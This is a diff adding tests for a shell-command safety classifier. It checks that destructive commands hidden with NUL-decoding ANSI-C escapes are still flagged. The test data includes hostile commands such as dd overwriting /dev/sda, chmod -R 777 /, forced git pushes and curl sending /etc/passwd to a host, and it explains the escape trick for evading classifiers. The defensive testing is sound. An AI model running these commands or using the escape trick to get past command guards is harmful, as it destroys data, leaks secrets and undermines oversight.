@@ -546,3 +546,54 @@ describe("built-in destructive floor: parity with the shipped dangerous-shell pa
     }
   });
 });
+
+// Task 241d9e9e. A word with a NUL-decoding ANSI-C escape decodes to a value
+// that still begins with the flag text (a literal U+0000 where the escape
+// stands), and the floor matches prefixes and short-flag clusters of it.
+// bash (GNU bash 3.2.57, `printf '[%s]' <word> | od -c`) truncates the run at
+// the NUL, so it passes the bare flag. Every spelling below was classified
+// by the floor before the read-only classifier learnt to refuse such a
+// command; they are pinned so the decoder can never again hand the floor a
+// raw `$'...'` token for one of them and lose the hit.
+describe("built-in destructive floor: NUL-escape spellings keep their verdict (task 241d9e9e)", () => {
+  it.each([
+    ["dd of= glued, NUL at the end of the run", "dd $'of=/dev/sda\\0' if=/dev/zero", "critical", "dd with an of= write target"],
+    ["dd of= after the input, \\x00", "dd if=/dev/zero $'of=/dev/sda\\x00'", "critical", "dd with an of= write target"],
+    ["dd of= with a control escape", "dd $'of=/dev/sda\\c@'", "critical", "dd with an of= write target"],
+    ["truncate -s0", "truncate $'-s0\\0' f", "critical", "truncate with a size argument"],
+    ["shred with a NUL after the flag", "shred $'--help\\0'", "critical", "shred overwrites a file in place"],
+    ["mkfs with a NUL after the flag", "mkfs $'-V\\0'", "critical", "mkfs formats a filesystem"],
+    ["bash -c with a NUL after the flag, nested dd", "bash $'-c\\0' 'dd of=/x'", "critical", "dd with an of= write target"],
+    ["git push -f", "git push $'-f\\0' origin main", "high", "git push --force"],
+    ["git push +ref", "git push origin $'+main\\0'", "high", "git push --force"],
+    ["git push --force-with-lease=", "git push $'--force-with-lease=x\\0'", "high", "git push --force"],
+    ["git clean -fd", "git clean $'-fd\\0'", "high", "git clean --force"],
+    ["git clean -f with a control escape", "git clean $'-f\\c@'", "high", "git clean --force"],
+    ["chmod -R", "chmod $'-R\\0' 777 /", "high", "chmod -R rewrites a whole tree"],
+    ["sed -i", "sed $'-i\\0' s/a/b/ f", "high", "sed in-place edit"],
+    ["sed --in-place=", "sed $'--in-place=.bak\\0' s/a/b/ f", "high", "sed in-place edit"],
+    ["curl -o", "curl $'-o\\0' /etc/x http://h", "high", "curl writes a local file"],
+    ["curl -X with a NUL in the method", "curl -X $'POST\\0' http://h", "high", "curl sends a request body or a non-GET/HEAD method"],
+    ["curl -XPOST glued", "curl $'-XPOST\\0' http://h", "high", "curl sends a request body or a non-GET/HEAD method"],
+    ["curl -d", "curl $'-d\\0' x http://h", "high", "curl sends a request body or a non-GET/HEAD method"],
+    ["curl -H @file", "curl -H $'@/etc/passwd\\0' http://h", "high", "curl reads a local file into the request"],
+  ])("%s: %s", (_label, command, severity, reasonPart) => {
+    const hits = classifyDestructiveShellFloor(command);
+    expect(hits.length).toBeGreaterThan(0);
+    expect(hits.some((h) => h.severity === severity && h.reason.includes(reasonPart))).toBe(true);
+  });
+
+  it("classifies dd with a NUL escape in the of= word as critical end to end, as its unquoted twin", () => {
+    expect(floorOnly("dd $'of=/dev/sda\\0' if=/dev/zero").severity).toBe("critical");
+    expect(floorOnly("dd of=/dev/sda if=/dev/zero").severity).toBe("critical");
+  });
+
+  it("classifies git push -f with a NUL escape as high end to end", () => {
+    expect(floorOnly("git push $'-f\\0' origin main").severity).toBe("high");
+  });
+
+  it("does not turn a NUL-escape spelling into a read-only command", () => {
+    expect(isReadOnlyBashCommand("dd $'of=/dev/sda\\0' if=/dev/zero")).toBe(false);
+    expect(isReadOnlyBashCommand("git push $'-f\\0' origin main")).toBe(false);
+  });
+});
